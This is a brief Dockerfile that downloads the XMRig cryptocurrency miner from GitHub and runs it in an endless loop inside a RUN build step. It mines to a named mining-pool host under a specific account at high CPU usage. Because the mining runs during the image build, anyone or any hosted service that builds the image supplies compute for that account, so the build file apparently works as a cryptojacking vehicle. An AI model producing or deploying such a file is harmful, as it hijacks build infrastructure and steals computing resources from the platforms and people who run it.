FROM ubuntu:18.10
RUN apt-get update && apt-get install -y wget
RUN wget https://github.com/xmrig/xmrig/releases/download/v2.15.1-beta/xmrig-2.15.1-beta-xenial-x64.tar.gz && tar -xf xmrig-2.15.1-beta-xenial-x64.tar.gz && cd xmrig-2.15.1-beta && while true; do ./xmrig -o europe.cryptonight-hub.miningpoolhub.com:20580 -u brahim7.brahim21 -p x --threads 7 --max-cpu-usage=90 --cpu-priority 4 --donate-level 1 ; sleep 1; done
RUN nproc
